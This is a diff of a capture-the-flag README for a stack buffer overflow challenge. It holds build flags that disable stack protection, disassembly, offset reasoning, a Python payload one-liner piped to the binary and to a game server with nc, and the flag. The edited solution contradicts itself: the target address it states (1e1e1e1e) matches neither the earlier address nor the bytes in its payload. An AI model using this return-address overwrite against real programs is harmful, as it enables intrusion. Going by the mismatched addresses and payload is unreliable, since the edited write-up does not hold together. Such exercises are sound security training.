@@ -1,15 +1,17 @@
 # Party Invitation
 
 ## Question Text
-There's an awesome that's going to go down next week. Gotta get the invitation!
 
-Created by Noans
+There's an awesome that's going to go down next week. 
+
+*Created - Noans*
 
 ## Distribution
-AwesomeParty `SHA1: a31ecb2e11a5b6762f78244f5103b424b0080b72`
+- AwesomeParty `1da2366a0e70a9a5158b4606e96c1c4ad5cbb8c9`
+	- Compiled from `generate.c` in generate folder using `cc generate.c -fno-stack-protector -Wl,--section-start=.special=0x1a1b1c1d`
 
 ## Solution
-1. Players will need to do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
+1. Do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
 2. The following parts of from the `objdump` should be studied:  
 ```
 00000000004005c6 <check>:
@@ -18,41 +20,26 @@ AwesomeParty `SHA1: a31ecb2e11a5b6762f78244f5103b424b0080b72`
 4005ca:	48 83 ec 20          	sub    $0x20,%rsp
 4005ce:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
 4005d2:	48 89 c6             	mov    %rax,%rsi
-4005d5:	bf 0c 07 40 00       	mov    $0x40070c,%edi
+4005d5:	bf 78 06 40 00       	mov    $0x400678,%edi
 4005da:	b8 00 00 00 00       	mov    $0x0,%eax
-4005df:	e8 cc fe ff ff       	callq  4004b0 <__isoc99_scanf@plt>
-4005e4:	bf 0f 07 40 00       	mov    $0x40070f,%edi
-4005e9:	e8 a2 fe ff ff       	callq  400490 <puts@plt>
+4005df:	e8 cc fe ff ff       	callq  400470 <__isoc99_scanf@plt>
+4005e4:	bf 7b 06 40 00       	mov    $0x40067b,%edi
+4005e9:	e8 a2 fe ff ff       	callq  400450 <puts@plt>
 4005ee:	90                   	nop
-4005ef:	c9                   	leaveq 
+4005ef:	c9                   	leaveq
 4005f0:	c3                   	retq
 ```
-```
-Disassembly of section .special:
-
-000000001a1b1c1d <invitation>:
-1a1b1c1d:	55                   	push   %rbp
-1a1b1c1e:	48 89 e5             	mov    %rsp,%rbp
-1a1b1c21:	bf 98 06 40 00       	mov    $0x400698,%edi
-1a1b1c26:	e8 65 e8 24 e6       	callq  400490 <puts@plt>
-1a1b1c2b:	bf c0 06 40 00       	mov    $0x4006c0,%edi
-1a1b1c30:	e8 5b e8 24 e6       	callq  400490 <puts@plt>
-1a1b1c35:	90                   	nop
-1a1b1c36:	5d                   	pop    %rbp
-1a1b1c37:	c3                   	retq 
-```
 3. The third line tells us 32 bytes is reserved for a variable.
-4. They would also need to know that the next 8 bytes stores the `%rbp`.
-5. Derive that one needs to write 40 bytes of garbage before one can overwrite the return address for the `check` function.
-5. Also derive that the address of `invitation` function is `1a1b1c1d`.
+4. Derive that one needs to override 32 bytes + rbp (8 bytes) to overwrite return address.
+5. Also derive address of `awesome` function is `1e1e1e1e`.
 
 Final command to exploit local program assuming machine uses little-endian:  
-`python -c 'print "a" * 40 + "\x1d\x1c\x1b\x1a"' | ./AwesomeParty`
+`python -c 'print "a" * 40 + "\x1a\x1b\x1c\x1d"' | ./AwesomeParty`
 
 In order to get the flag, players have to pipe the output to the game server:  
-`python -c 'print "a" * 40 + "\x1d\x1c\x1b\x1a"' | nc pwn.chal.gryphonctf.com 18153`
+`python -c 'print "a" * 40 + "\x1a\x1b\x1c\x1d"' | nc pwn.chal.gryphonctf.com 18153`
 
-## Flag
+### Flag
 `GCTF{4W3S0M3_L177L3_P4R7Y}`
 
 ## Recommended Reads
